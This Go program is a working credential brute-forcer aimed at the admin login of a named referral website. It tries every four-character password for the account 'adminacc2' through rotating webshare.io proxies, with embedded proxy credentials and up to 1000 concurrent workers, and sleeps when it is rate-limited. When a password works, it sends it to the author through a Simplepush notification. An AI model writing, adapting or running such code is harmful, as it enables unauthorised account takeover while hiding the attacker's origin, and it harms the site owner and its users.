package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/simplepush/simplepush-go"
)

const (
	loginURL        = "https://fredfrostreferral.com/index.php"                    // Replace with the actual login URL
	webshareProxy   = "http://005844proxies-rotate:005844proxies@p.webshare.io:80" // Replace with your webshare.io proxy URL
	concurrentLimit = 1000                                                         // Adjust concurrency level
)

// Job struct for representing a password to be tested
type Job struct {
	Password string
	ProxyURL *url.URL
}

func worker(jobs <-chan Job, stopChan chan struct{}) {
	proxyClient := &http.Client{} // Create client once per worker

	for job := range jobs {
		proxyClient.Transport = &http.Transport{Proxy: http.ProxyURL(job.ProxyURL)}

		formData := url.Values{
			"loginUsername": {"adminacc2"},
			"loginPassword": {job.Password},
			"entityLogin":   {"Login"},
		}

		resp, err := proxyClient.PostForm(loginURL, formData)
		if err != nil {
			fmt.Printf("Error with password %s: %v\n", job.Password, err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), "<title>Home Page</title>") {
			fmt.Printf("Successful: Password found: %s\n", job.Password)
			simplepush.Send(simplepush.Message{
				SimplePushKey: "nathan123",
				Title:         "Done",
				Message:       fmt.Sprintf("Done, the password is %s", job.Password),
				Event:         "event",
				Encrypt:       false, Password: "", Salt: ""})
			close(stopChan) // Signal other workers to stop
			return          // Worker exits
		} else if strings.Contains(string(body), "<title>FredTrading Referral Login</title>") {
			fmt.Printf("Wrong Password: %s\n", job.Password)
		} else {
			time.Sleep(60 * time.Second)
		}
	}
}

func main() {
	proxyURL, _ := url.Parse(webshareProxy)
	stopChan := make(chan struct{})
	chars := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>/?")

	jobs := make(chan Job, concurrentLimit)

	for i := 0; i < concurrentLimit; i++ { // Start workers
		go worker(jobs, stopChan)
	}

	for i := 0; i < len(chars); i++ {
		for j := 0; j < len(chars); j++ {
			for k := 0; k < len(chars); k++ {
				for l := 0; l < len(chars); l++ {
					select {
					case <-stopChan:
						return // Stop if the password is found
					default:
						password := string(chars[i]) + string(chars[j]) + string(chars[k]) + string(chars[l])
						jobs <- Job{password, proxyURL} // Send job to the queue

						time.Sleep(100 * time.Millisecond) // Rate limiting
					}
				}
			}
		}
	}

	close(jobs) // Signal that there are no more jobs
}
